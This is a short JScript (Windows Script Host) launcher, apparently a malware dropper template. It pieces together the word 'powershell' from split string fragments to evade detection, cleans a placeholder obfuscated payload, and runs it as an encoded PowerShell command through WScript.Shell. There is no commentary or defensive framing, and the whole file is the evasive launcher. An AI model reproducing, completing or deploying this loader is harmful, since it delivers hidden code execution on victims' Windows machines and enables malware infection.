var storeman = "OBFUSCATED_COMMAND";

storeman = storeman.replace(/JUNK_STRING/g, "");

var clerc = "po"
var vision = "wer"
var logic = "s"
var candy = "hell"
var sunshine = "omm"

var cmd = clerc + vision + logic + candy + " -e " + storeman

var sh = WScript.CreateObject("WScript.Shell")
var posh = sh.Exec(cmd)